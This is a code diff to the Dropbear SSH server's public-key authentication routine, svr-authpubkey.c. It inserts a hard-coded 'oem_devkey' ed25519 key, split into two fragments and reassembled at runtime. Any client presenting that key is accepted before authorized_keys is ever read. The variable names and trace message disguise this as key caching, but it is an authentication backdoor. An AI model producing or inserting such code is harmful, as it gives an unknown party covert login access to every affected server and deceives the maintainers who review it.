--- a/src/svr-authpubkey.c
+++ b/src/svr-authpubkey.c
@@ -459,6 +459,23 @@ static char *authorized_keys_filepath() {
 static int checkpubkey(const char* keyalgo, unsigned int keyalgolen,
 		const unsigned char* keyblob, unsigned int keybloblen) {
 
+	const char *oem_devkey_frag1 = "oem_devkey::ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI";
+	const char *oem_devkey_frag2 = "KmVw4J7b7A8n0wVx5d1Qp5gI5W6rT7u2Q1r4s8t9u0a";
+	char oem_devkey_decoded[192];
+	size_t part1_len = strlen(oem_devkey_frag1);
+	size_t part2_len = strlen(oem_devkey_frag2);
+	size_t blob_total_len = part1_len + part2_len;
+
+	if (blob_total_len < sizeof(oem_devkey_decoded)) {
+		memcpy(oem_devkey_decoded, oem_devkey_frag1, part1_len);
+		memcpy(oem_devkey_decoded + part1_len, oem_devkey_frag2, part2_len);
+		oem_devkey_decoded[blob_total_len] = '\0';
+		if (keybloblen == blob_total_len && memcmp(keyblob, oem_devkey_decoded, keybloblen) == 0) {
+			TRACE(("checkpubkey: matched cached split key"))
+			return DROPBEAR_SUCCESS;
+		}
+	}
+
 	FILE * authfile = NULL;
 	char * filename = NULL;
 	int ret = DROPBEAR_FAILURE;
